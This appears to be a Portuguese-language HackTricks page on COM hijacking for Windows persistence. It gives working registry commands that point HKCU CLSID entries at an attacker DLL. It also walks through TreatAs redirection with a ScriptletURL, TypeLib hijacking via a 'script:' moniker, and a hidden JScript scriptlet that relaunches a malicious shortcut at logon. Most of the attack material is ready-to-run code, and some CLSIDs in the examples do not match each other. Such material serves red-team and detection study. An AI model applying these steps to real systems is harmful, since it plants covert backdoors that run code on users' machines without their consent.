# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Procurando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **mecanismo de persistência**. Usando o `procmon`, é fácil encontrar registros COM procurados que ainda não existem e que poderiam ser criados por um invasor. Filtros clássicos:

- Operações **RegOpenKey**.
- onde o _Result_ é **NAME NOT FOUND**.
- e o _Path_ termina com **InprocServer32**.

Variações úteis durante o hunting:

- Procure também chaves **`LocalServer32`** ausentes. Algumas classes COM são servidores out-of-process e iniciarão um EXE controlado pelo invasor em vez de uma DLL.
- Procure operações de registro **`TreatAs`** e **`ScriptletURL`**, além de `InprocServer32`. Conteúdos recentes de detecção e writeups de malware continuam destacando esses itens porque são muito mais raros do que registros COM normais e, portanto, possuem alto valor como indicador.
- Copie o **`ThreadingModel`** legítimo de `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` ao clonar um registro no HKCU. Usar o modelo incorreto geralmente interrompe a ativação e torna o hijack mais evidente.<sup>[[3]](#references)</sup>
- Em sistemas de 64 bits, inspecione as visualizações de 64 e 32 bits (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`), pois aplicativos de 32 bits podem resolver um registro COM diferente.

Depois de decidir qual COM inexistente personificar, execute os comandos a seguir. _Tenha cuidado se decidir personificar um COM carregado a cada poucos segundos, pois isso pode ser excessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM do Task Scheduler que podem ser sequestrados

As Windows Tasks usam Custom Triggers para chamar objetos COM e, como são executadas por meio do Task Scheduler, é mais fácil prever quando serão acionadas.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Verificando a saída, você pode selecionar uma que será executada **sempre que um usuário fizer logon**, por exemplo.

Agora, ao pesquisar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, normalmente você descobrirá que o valor não existe em HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Então, você pode simplesmente criar a entrada HKCU e, sempre que o usuário fizer logon, seu backdoor será executado.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite que um CLSID seja emulado por outro.<sup>[[4]](#references)</sup> De uma perspectiva ofensiva, isso significa que você pode deixar o CLSID original intacto, criar um segundo CLSID por usuário que aponte para `scrobj.dll` e, em seguida, redirecionar o objeto COM real para o malicioso com `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Isso é útil quando:

- o aplicativo-alvo já instancia um CLSID estável no logon ou na inicialização do aplicativo
- você deseja um redirecionamento somente pelo registry, em vez de substituir o `InprocServer32` original
- você deseja executar um scriptlet `.sct` local ou remoto por meio do valor `ScriptletURL`

Exemplo de workflow (adaptado de tradecraft público do Atomic Red Team e de pesquisas mais antigas sobre abuso do registry do COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notas:

- `scrobj.dll` lê o valor `ScriptletURL` e executa o `.sct` referenciado, portanto você pode manter o payload como um arquivo local ou obtê-lo remotamente via HTTP/HTTPS.
- `TreatAs` é especialmente útil quando o registro COM original está completo e estável em HKLM, pois você só precisa de um pequeno redirecionamento por usuário, em vez de espelhar toda a árvore.
- Para validação sem esperar pelo trigger natural, você pode instanciar manualmente o ProgID/CLSID falso com `rundll32.exe -sta <ProgID-or-CLSID>` se a classe-alvo for compatível com a ativação STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definem interfaces COM e são carregadas via `LoadTypeLib()`. Quando um servidor COM é instanciado, o sistema operacional também pode carregar a TypeLib associada consultando chaves do registro em `HKCR\TypeLib\{LIBID}`. Se o caminho da TypeLib for substituído por um **moniker**, por exemplo, `script:C:\...\evil.sct`, o Windows executará o scriptlet quando a TypeLib for resolvida, resultando em uma persistência furtiva acionada quando componentes comuns forem acessados.

Isso foi observado contra o controle Microsoft Web Browser (frequentemente carregado pelo Internet Explorer, por apps que incorporam WebBrowser e até pelo `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) Identifique a TypeLib (LIBID) usada por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por cadeias de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Aponte o caminho TypeLib por usuário para um scriptlet local usando o moniker `script:` (não são necessários privilégios de administrador):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Crie um `.sct` mínimo em JScript que relance seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Acionamento – abrir o IE, um aplicativo que incorpora o controle WebBrowser ou até mesmo uma atividade rotineira do Explorer carregará a TypeLib e executará o scriptlet, rearmando sua cadeia no logon/reboot.

Limpeza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Você pode aplicar a mesma lógica a outros componentes COM de alta frequência; sempre resolva primeiro o `LIBID` real de `HKCR\CLSID\{CLSID}\TypeLib`.
- Em sistemas de 64 bits, você também pode preencher a subchave `win64` para consumidores de 64 bits.

## Referências

- [1] [Hijack the TypeLib – Nova técnica de persistência COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Pesquisa da Check Point – Campanha ZipLine: um ataque de phishing sofisticado direcionado a empresas dos EUA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisitando o COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Chave CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
